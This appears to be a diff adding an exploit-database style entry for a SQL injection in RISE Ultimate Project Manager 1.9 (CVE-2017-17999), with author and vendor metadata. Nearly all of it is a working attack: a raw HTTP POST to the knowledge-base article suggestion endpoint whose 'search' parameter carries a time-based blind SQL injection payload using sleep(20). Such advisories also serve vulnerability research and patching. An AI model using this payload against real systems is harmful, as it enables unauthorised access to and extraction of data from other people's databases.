@@ -1,0 +1,24 @@
+# Exploit Title: RISE Ultimate Project Manager 1.9 - SQL Injection
+# Exploit Author: Ahmad Mahfouz 
+# Contact: http://twitter.com/eln1x
+# Date: 30/12/2017
+# CVE: CVE-2017-17999
+# Vendor Homepage: http://fairsketch.com/
+# Version: 1.9
+
+ 
+
+ 
+
+POST /index.php/knowledge_base/get_article_suggestion/ HTTP/1.1
+Host: localhost
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 14
+Connection: close
+
+ 
+search=product'%20and%20(select*from(select(sleep(20)))a)--%20
